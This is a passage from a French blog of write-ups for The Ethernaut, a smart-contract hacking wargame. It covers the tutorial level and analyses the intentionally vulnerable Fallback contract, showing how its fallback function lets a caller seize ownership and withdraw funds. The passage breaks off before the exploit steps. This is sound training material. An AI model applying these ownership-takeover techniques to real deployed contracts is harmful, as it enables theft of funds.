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
MyswMzowMCvbYHQAAAAASUVORK5CYII=" />
</svg>

  </a>


</div>






  <div class="sidebar-item">
    <p style="font-size: 0.9em;">
      2018 - 2020 &copy; Adel ALLAM.
    </p>
  </div>
</div>


    <!-- Wrap is the content to shift when toggling the sidebar. We wrap the
         content to avoid any CSS collisions with our real content. -->
    <div class="wrap">
      <div class="masthead">
        <div class="container">
          <h3 class="masthead-title">
            <a href="/" title="Home">Adel ALLAM</a>
            <small>@apges01</small>
          </h3>
        </div>
      </div>

      <div class="container content">
        <div class="post">
  <h1 class="post-title">the ethernaut</h1>
  <span class="post-date">24/05/2020</span>
  <!--more-->

<hr />

<p>Writeups sur l’exploitation de failles liées aux smart contracts Ethereum.</p>

<h3 id="description">Description</h3>

<p>The Ethernaut is a Web3/Solidity based wargame inspired on <a href="https://overthewire.org">overthewire.org</a>, played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be ‘hacked’.</p>

<p>The game is 100% open source and all levels are contributions made by other players. Do you have an interesting idea? PRs are welcome at <a href="https://github.com/OpenZeppelin/ethernaut">ethernaut</a>.</p>

<hr />

<h2 id="0---hello-ethernaut">0 - Hello Ethernaut</h2>

<hr />

<blockquote>
  <p><strong>TL;DR</strong></p>

  <p>Analyser un ABI, remarquer la fonction <code class="highlighter-rouge">password()</code>, l’appeler pour récuper le mot de passe.</p>
</blockquote>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// see contract</span>
<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span>
<span class="p">...</span>

<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">info</span><span class="p">()</span>
<span class="s2">"You will find what you need in info1()."</span>

<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">info1</span><span class="p">()</span>
<span class="s2">"Try info2(), but with </span><span class="se">\"</span><span class="s2">hello</span><span class="se">\"</span><span class="s2"> as a parameter."</span>

<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">info2</span><span class="p">(</span><span class="s2">"hello"</span><span class="p">)</span>
<span class="s2">"The property infoNum holds the number of the next info method to call."</span>

<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">infoNum</span><span class="p">()</span>
<span class="mi">42</span>

<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">info42</span><span class="p">()</span>
<span class="s2">"theMethodName is the name of the next method."</span>

<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">theMethodName</span><span class="p">()</span>
<span class="s2">"The method name is method7123949."</span>

<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">method7123949</span><span class="p">()</span>
<span class="s2">"If you know the password, submit it to authenticate()."</span>

<span class="c1">// we have to find a password, let's analyse the ABI</span>
<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">abi</span>
<span class="mi">0</span><span class="p">:</span>  <span class="nb">Object</span> <span class="p">{</span> <span class="nl">constant</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">name</span><span class="p">:</span> <span class="s2">"password"</span><span class="p">,</span> <span class="nx">payable</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="err">…</span> <span class="p">}</span>
<span class="mi">1</span><span class="p">:</span>  <span class="nb">Object</span> <span class="p">{</span> <span class="nl">constant</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">name</span><span class="p">:</span> <span class="s2">"infoNum"</span><span class="p">,</span> <span class="nx">payable</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="err">…</span> <span class="p">}</span>
<span class="mi">2</span><span class="p">:</span>  <span class="nb">Object</span> <span class="p">{</span> <span class="nl">constant</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">name</span><span class="p">:</span> <span class="s2">"theMethodName"</span><span class="p">,</span> <span class="nx">payable</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="err">…</span> <span class="p">}</span>
<span class="mi">3</span><span class="p">:</span>  <span class="nb">Object</span> <span class="p">{</span> <span class="nl">payable</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="nx">stateMutability</span><span class="p">:</span> <span class="s2">"nonpayable"</span><span class="p">,</span> <span class="nx">type</span><span class="p">:</span> <span class="s2">"constructor"</span><span class="p">,</span> <span class="err">…</span> <span class="p">}</span>
<span class="mi">4</span><span class="p">:</span>  <span class="nb">Object</span> <span class="p">{</span> <span class="nl">constant</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">name</span><span class="p">:</span> <span class="s2">"info"</span><span class="p">,</span> <span class="nx">payable</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="err">…</span> <span class="p">}</span>
<span class="mi">5</span><span class="p">:</span>  <span class="nb">Object</span> <span class="p">{</span> <span class="nl">constant</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">name</span><span class="p">:</span> <span class="s2">"info1"</span><span class="p">,</span> <span class="nx">payable</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="err">…</span> <span class="p">}</span>
<span class="mi">6</span><span class="p">:</span>  <span class="nb">Object</span> <span class="p">{</span> <span class="nl">constant</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">name</span><span class="p">:</span> <span class="s2">"info2"</span><span class="p">,</span> <span class="nx">payable</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="err">…</span> <span class="p">}</span>
<span class="mi">7</span><span class="p">:</span>  <span class="nb">Object</span> <span class="p">{</span> <span class="nl">constant</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">name</span><span class="p">:</span> <span class="s2">"info42"</span><span class="p">,</span> <span class="nx">payable</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="err">…</span> <span class="p">}</span>
<span class="mi">8</span><span class="p">:</span>  <span class="nb">Object</span> <span class="p">{</span> <span class="nl">constant</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">name</span><span class="p">:</span> <span class="s2">"method7123949"</span><span class="p">,</span> <span class="nx">payable</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="err">…</span> <span class="p">}</span>
<span class="mi">9</span><span class="p">:</span>  <span class="nb">Object</span> <span class="p">{</span> <span class="nl">constant</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="nx">name</span><span class="p">:</span> <span class="s2">"authenticate"</span><span class="p">,</span> <span class="nx">payable</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="err">…</span> <span class="p">}</span>
<span class="mi">10</span><span class="p">:</span> <span class="nb">Object</span> <span class="p">{</span> <span class="nl">constant</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">name</span><span class="p">:</span> <span class="s2">"getCleared"</span><span class="p">,</span> <span class="nx">payable</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="err">…</span> <span class="p">}</span>

<span class="c1">// password() function return a string :) </span>
<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">abi</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="p">{</span> <span class="nl">constant</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">inputs</span><span class="p">:</span> <span class="p">[],</span> <span class="nx">name</span><span class="p">:</span> <span class="s2">"password"</span><span class="p">,</span> <span class="nx">outputs</span><span class="p">:</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">[</span><span class="err">…</span><span class="p">],</span> <span class="nx">payable</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="nx">stateMutability</span><span class="p">:</span> <span class="s2">"view"</span><span class="p">,</span> <span class="nx">type</span><span class="p">:</span> <span class="s2">"function"</span> <span class="p">}</span>

<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">password</span><span class="p">()</span>
<span class="s2">"ethernaut0"</span>

<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">authenticate</span><span class="p">(</span><span class="s2">"ethernaut0"</span><span class="p">)</span>
</code></pre></div></div>

<p>Premier niveau pour se familiariser avec les interactions avec le smart contract.</p>

<blockquote>
  <p>Congratulations! You have completed the tutorial. Have a look at the Solidity code for the contract you just interacted with below.</p>

  <p>You are now ready to complete all the levels of the game, and as of now, you’re on your own.</p>

  <p>Godspeed!!</p>

  <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// contract</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Instance</span> <span class="p">{</span>

<span class="nx">string</span> <span class="kr">public</span> <span class="nx">password</span><span class="p">;</span>
<span class="nx">uint8</span> <span class="kr">public</span> <span class="nx">infoNum</span> <span class="o">=</span> <span class="mi">42</span><span class="p">;</span>
<span class="nx">string</span> <span class="kr">public</span> <span class="nx">theMethodName</span> <span class="o">=</span> <span class="s1">'The method name is method7123949.'</span><span class="p">;</span>
<span class="nx">bool</span> <span class="kr">private</span> <span class="nx">cleared</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>

<span class="c1">// constructor</span>
<span class="kd">constructor</span><span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span> <span class="nx">_password</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
 <span class="nx">password</span> <span class="o">=</span> <span class="nx">_password</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">info</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">pure</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span><span class="p">)</span> <span class="p">{</span>
 <span class="k">return</span> <span class="s1">'You will find what you need in info1().'</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">info1</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">pure</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span><span class="p">)</span> <span class="p">{</span>
 <span class="k">return</span> <span class="s1">'Try info2(), but with "hello" as a parameter.'</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">info2</span><span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span> <span class="nx">param</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">pure</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span><span class="p">)</span> <span class="p">{</span>
 <span class="k">if</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">param</span><span class="p">))</span> <span class="o">==</span> <span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="s1">'hello'</span><span class="p">)))</span> <span class="p">{</span>
   <span class="k">return</span> <span class="s1">'The property infoNum holds the number of the next info method to call.'</span><span class="p">;</span>
 <span class="p">}</span>
 <span class="k">return</span> <span class="s1">'Wrong parameter.'</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">info42</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">pure</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span><span class="p">)</span> <span class="p">{</span>
 <span class="k">return</span> <span class="s1">'theMethodName is the name of the next method.'</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">method7123949</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">pure</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span><span class="p">)</span> <span class="p">{</span>
 <span class="k">return</span> <span class="s1">'If you know the password, submit it to authenticate().'</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">authenticate</span><span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span> <span class="nx">passkey</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
 <span class="k">if</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">passkey</span><span class="p">))</span> <span class="o">==</span> <span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">password</span><span class="p">)))</span> <span class="p">{</span>
   <span class="nx">cleared</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
 <span class="p">}</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">getCleared</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
 <span class="k">return</span> <span class="nx">cleared</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">}</span>
</code></pre></div>  </div>
</blockquote>

<hr />

<h2 id="1---fallback">1 - Fallback</h2>

<hr />

<blockquote>
  <p><strong>TL;DR</strong></p>

  <p>Devenir propriétaire d’un smart contract en utilisant la fallback function.</p>
</blockquote>

<p>Look carefully at the contract’s code below.</p>

<p>You will beat this level if</p>

<ol>
  <li>you claim ownership of the contract</li>
  <li>you reduce its balance to 0</li>
</ol>

<p>Things that might help</p>

<ul>
  <li>How to send ether when interacting with an ABI</li>
  <li>How to send ether outside of the ABI</li>
  <li>Converting to and from wei/ether units -see <code class="highlighter-rouge">help()</code> command-</li>
  <li>Fallback methods</li>
</ul>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="s1">'openzeppelin-solidity/contracts/math/SafeMath.sol'</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Fallback</span> <span class="p">{</span>

  <span class="nx">using</span> <span class="nx">SafeMath</span> <span class="k">for</span> <span class="nx">uint256</span><span class="p">;</span>
  <span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">contributions</span><span class="p">;</span>
  <span class="nx">address</span> <span class="nx">payable</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>

  <span class="kd">constructor</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
    <span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1000</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span> <span class="nx">ether</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="nx">modifier</span> <span class="nx">onlyOwner</span> <span class="p">{</span>
        <span class="nx">require</span><span class="p">(</span>
            <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">owner</span><span class="p">,</span>
            <span class="s2">"caller is not the owner"</span>
        <span class="p">);</span>
        <span class="nx">_</span><span class="p">;</span>
    <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">contribute</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
    <span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">&lt;</span> <span class="mf">0.001</span> <span class="nx">ether</span><span class="p">);</span>
    <span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">+=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">&gt;</span> <span class="nx">contributions</span><span class="p">[</span><span class="nx">owner</span><span class="p">])</span> <span class="p">{</span>
      <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">getContribution</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">uint</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">];</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">withdraw</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">onlyOwner</span> <span class="p">{</span>
    <span class="nx">owner</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="kd">function</span><span class="p">()</span> <span class="nx">payable</span> <span class="nx">external</span> <span class="p">{</span>
    <span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="analyse">Analyse</h3>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">using</span> <span class="nx">SafeMath</span> <span class="k">for</span> <span class="nx">uint256</span><span class="p">;</span>
<span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">contributions</span><span class="p">;</span>
<span class="nx">address</span> <span class="nx">payable</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>
</code></pre></div></div>

<p>On commence par définir 2 variables:</p>

<ul>
  <li><code class="highlighter-rouge">contributions</code>: tableau qui va associer une adresse à un entier (un solde)</li>
  <li><code class="highlighter-rouge">owner</code>: une adresse</li>
</ul>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">constructor</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
	<span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
	<span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1000</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span> <span class="nx">ether</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>On définit ensuite le constructeur du smart contrat. Ce dernier va initialiser la variable <code class="highlighter-rouge">owner</code> à l’adresse <code class="highlighter-rouge">msg.sender</code>.</p>

<blockquote>
  <ul>
    <li><code class="highlighter-rouge">constructor()</code> est appelé une seule fois dans la vie d’un smart contract, lors de sa création</li>
    <li><code class="highlighter-rouge">msg.sender</code> correspond à l’entité ayant déployé ce smart contract sur le réseau, cela peut-être un client ou un autre smart contract</li>
  </ul>
</blockquote>

<p>On défini ensuite <code class="highlighter-rouge">contributions[owner] = 1000 ether</code>. Ce qui représente une grosse somme.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">modifier</span> <span class="nx">onlyOwner</span> <span class="p">{</span>
    <span class="nx">require</span><span class="p">(</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">owner</span><span class="p">,</span> <span class="s2">"caller is not the owner"</span> <span class="p">);</span>
	<span class="nx">_</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>On définit ensuite le modifieur <code class="highlighter-rouge">onlyOwner</code>, un modifieur en Solidity permet d’ajouter des restrictions sur un appel à une fonction, il a un rôle similaire à un <code class="highlighter-rouge">assert</code> ou à un décorateur. Ce modifieur permet de s’assurer que l’émetteur de la transaction est bien l’<code class="highlighter-rouge">owner</code>.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">contribute</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
	<span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">&lt;</span> <span class="mf">0.001</span> <span class="nx">ether</span><span class="p">);</span>
	<span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">+=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
	<span class="k">if</span><span class="p">(</span><span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">&gt;</span> <span class="nx">contributions</span><span class="p">[</span><span class="nx">owner</span><span class="p">])</span> <span class="p">{</span>
		<span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>On définit ensuite la fonction <code class="highlighter-rouge">contribute()</code>, celle-ci est <code class="highlighter-rouge">payable</code>, cela signifie que lors de son appel, on peut envoyer des ethers. Elle permet de réaliser une contribution dans le smart contract.</p>

<ul>
  <li><code class="highlighter-rouge">require(msg.value &lt; 0.001 ether)</code>: limiter la valeur de la contribution à 0.001 ether par transaction</li>
  <li><code class="highlighter-rouge">contributions[msg.sender] += msg.value</code>: contribution de l’émetteur</li>
  <li><code class="highlighter-rouge">contributions[msg.sender] &gt; contributions[owner]</code>: condition pour devenir <code class="highlighter-rouge">owner</code> du smart contract</li>
</ul>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">getContribution</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">uint</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">];</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Connaître notre contribution au smart contract.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">withdraw</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">onlyOwner</span> <span class="p">{</span>
	<span class="nx">owner</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Fonction qui permet de récupérer (<code class="highlighter-rouge">owner.transfer()</code>) tous le solde (<code class="highlighter-rouge">address(this).balance</code>) du smart contract. Cette fonction utilise le modifieur <code class="highlighter-rouge">onlyOwner</code>, seul le propriétaire peut donc récupérer tous les fonds du smart contract.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span><span class="p">()</span> <span class="nx">payable</span> <span class="nx">external</span> <span class="p">{</span>
    <span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Cette fonction ne porte pas de nom, et est <code class="highlighter-rouge">payable</code>, elle correspond alors à la fonction de fallback de ce smart contract. C’est la fonction appelée lorsque aucune autre fonction n’est appelée.</p>

<blockquote>
  <p>A contract can have exactly one unnamed function. This function cannot have arguments, cannot return anything and has to have <code class="highlighter-rouge">external</code> visibility. It is executed on a call to the contract if none of the other functions match the given function identifier (or if no data was supplied at all).</p>
</blockquote>

<p>Le but va être de devenir <code class="highlighter-rouge">owner</code> du smart contract afin de pouvoir appeler le fonction <code class="highlighter-rouge">withdraw()</code>. Nous devons alors réussir à exécuter une ligne de type <code class="highlighter-rouge">owner = msg.sender</code>.</p>

